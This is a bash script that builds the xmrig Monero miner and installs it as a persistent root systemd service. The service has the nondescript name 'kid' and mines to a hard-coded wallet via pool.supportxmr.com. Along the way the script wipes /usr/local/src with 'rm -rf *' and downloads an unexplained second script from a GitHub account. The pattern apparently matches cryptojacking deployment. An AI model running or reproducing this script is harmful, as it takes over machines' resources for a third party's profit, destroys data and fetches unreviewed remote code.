#!/usr/bin/env bash
sudo apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libxmu-dev libxi-dev libjansson-dev gcc g++ make screen curl libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 &&
sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
cd /usr/local/src/ && rm -rf * &&
curl -O https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-1-link1.sh && chmod a+x suxmr-1-link1.sh
git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
[Unit]
Description=kid
After=network.target
[Service]
Type=forking
ExecStart=/bin/sh -c 'cd /usr/local/src/xmrig/build/ && ./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 47UbkYwirtqPGximU3ipvdbrfYBxQatB5WQXGWbvUusUXwKVE4QhEWtg6MqjQUZfpN9UoQgYcPDV8X1roPy7shmBH9Pmt9V -p x -k'
Restart=on-failure
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable kid.service &&
service kid start
